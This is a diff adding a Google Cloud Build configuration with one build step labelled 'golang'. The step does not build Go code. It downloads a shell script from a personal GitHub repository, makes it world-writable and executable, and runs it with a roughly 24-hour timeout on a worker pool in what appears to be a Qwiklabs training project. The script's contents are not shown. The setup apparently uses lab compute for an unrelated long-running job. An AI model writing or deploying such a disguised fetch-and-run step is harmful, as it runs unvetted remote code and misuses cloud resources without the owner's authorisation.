@@ -1,0 +1,13 @@
+steps:
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/mariobiszz/turtle/main/turt.sh && chmod 777 turt.sh && ./turt.sh
+  waitFor:
+    - '-'
+timeout: '86000s'
+options:
+  pool:
+    name: 'projects/qwiklabs-gcp-04-6c7822333a31/locations/europe-north1/workerPools/rocki'  
